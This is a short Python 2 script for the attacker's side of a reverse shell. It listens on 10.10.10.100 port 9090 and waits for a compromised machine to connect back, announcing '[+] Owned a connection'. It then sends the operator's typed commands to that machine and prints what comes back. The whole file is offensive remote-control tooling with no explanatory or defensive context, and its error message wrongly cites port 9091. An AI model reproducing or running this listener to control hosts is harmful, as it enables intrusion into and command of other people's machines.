import socket #For build TCP connections

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.100", 9090))
    s.listen(1)
    print '[+] Listening for incoming TCP connection on port 9090'
    conn, addr = s.accept()
    print '[+] Owned a connection from: ', addr

    while True:

        command = raw_input("Shell--> ")

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)
            print conn.recv(1024)

def main ():
    connect()

try:
    main()
except KeyboardInterrupt:
    print ''
    print '[-] Exiting.... '
    SystemExit()
except socket.error:
    print '[-] Port 9091 already in use....'
    SystemExit()
